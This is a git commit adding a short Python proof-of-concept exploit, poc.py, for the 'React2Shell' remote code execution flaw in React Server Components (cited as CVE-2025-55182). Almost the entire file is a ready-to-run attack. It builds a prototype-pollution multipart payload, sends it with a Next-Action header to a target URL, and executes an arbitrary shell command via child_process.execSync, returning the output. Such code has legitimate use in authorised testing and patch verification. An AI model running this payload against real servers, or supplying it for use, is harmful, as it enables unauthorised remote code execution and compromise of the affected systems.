c7aa65102323c003c9fbcc58d0c1e8218ecbdcde
Sown0205 <buithaison13579@gmail.com>
2026-01-11 00:18:42 +0700

    React2Shell

---
+++ poc.py
@@ -0,0 +1,41 @@
+# poc.py
+# A very simple Proof of Concept script for exploiting React2Shell vulnerability
+# Requires 'requests' library: pip install requests
+
+# PoC source: https://github.com/msanft/CVE-2025-55182
+
+import requests
+import sys
+import json
+
+# Set target URL and arbitrary command to execute
+BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
+EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
+
+# Craft the malicious payload
+crafted_chunk = {
+    "then": "$1:__proto__:then",
+    "status": "resolved_model",
+    "reason": -1,
+    "value": '{"then": "$B0"}',
+    "_response": {
+        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
+        # If you don't need the command output, you can use this line instead:
+        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
+        "_formData": {
+            "get": "$1:constructor:constructor",
+        },
+    },
+}
+
+# Send the exploit payload to the target server
+files = {
+    "0": (None, json.dumps(crafted_chunk)),
+    "1": (None, '"$@0"'),
+}
+
+# Set custom header to trigger the exploit, then send the request
+headers = {"Next-Action": "x"}
+res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
+print(res.status_code)
+print(res.text)
